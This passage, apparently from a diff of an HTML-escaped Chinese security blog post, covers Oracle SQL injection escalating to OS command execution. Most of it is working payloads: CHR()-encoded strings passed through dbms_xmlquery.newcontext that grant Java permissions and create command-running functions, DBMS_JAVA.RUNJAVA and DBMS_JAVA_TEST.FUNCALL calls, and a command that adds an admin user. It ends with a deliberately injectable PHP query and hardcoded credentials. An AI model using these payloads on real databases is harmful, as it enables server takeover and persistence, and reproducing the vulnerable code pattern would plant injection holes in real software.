HR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(32)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(60)||CHR(60)||CHR(65)||CHR(76)||CHR(76)||CHR(32)||CHR(70)||CHR(73)||CHR(76)||CHR(69)||CHR(83)||CHR(62)||CHR(62)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(32)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
+' and 1=myjava()--
+' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(49)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(119)||CHR(114)||CHR(105)||CHR(116)||CHR(101)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(68)||CHR(101)||CHR(115)||CHR(99)||CHR(114)||CHR(105)||CHR(112)||CHR(116)||CHR(111)||CHR(114)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(42)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
+' and 1=myjava1()--
+' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(50)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(68)||CHR(101)||CHR(115)||CHR(99)||CHR(114)||CHR(105)||CHR(112)||CHR(116)||CHR(111)||CHR(114)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(42)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(73)||CHR(77)||CHR(80)||CHR(79)||CHR(82)||CHR(84)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(40)||CHR(80)||CHR(79)||CHR(76)||CHR(41)||CHR(59)||CHR(69)||CHR(78)||CHR(68)||CHR(59)||CHR(39)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(49)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) is not null--
+' and 1=myjava2()--
+' and 1=2 union select 1,(select javacmd('whoami') from dual),3 from dual--
+
+如果有了java.io.permisson(or javasyspriv)权限的话也可以调用下面有漏洞的包直接执行系统命令
+DBMS_JAVA.RUNJAVA() 11g R1 and R2
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c net user admin password /add') FROM DUAL;
+DBMS_JAVA_TEST.FUNCALL()  10g R2, 11g R1 and R2
+Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd &amp;gt; /tmp/pwd.txt') from dual;
+Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c','dir &amp;gt; c:\\pwd.txt') from dual; #windows ORA-29540: class oracle/aurora/util/Wrapper does not exist
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x3-实战&quot;&gt;0x3 实战&lt;/h3&gt;
+&lt;p&gt;这里利用上面的一个总结，进行一个实战。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;数据库表如下：
+create table users(id int,name varchar(255),age int);
+INSERT INTO users VALUES ('1', 'test', '22');
+INSERT INTO users VALUES ('2', 'admin', '33');
+INSERT INTO users VALUES ('3', 'aaaa', '44');
+commit;
+服务端代码如下：
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(DESCRIPTION=(ADDRESS_LIST = (ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.44.157)(PORT = 1521)))(CONNECT_DATA=(SID=orcl)))&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+    &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;oci_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'TEST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test123456789'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Cannot connect to the database: '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;oci_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$stat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;oci_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id,name,age FROM TEST.users WHERE name LIKE '%&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id,name,age FROM TEST.users WHERE name LIKE '%&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;oci_execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;table&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;ID&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Age&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;oci_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OCI_BOTH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;tr&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;td&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ID'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;/td&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;td&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'NAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;/td&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
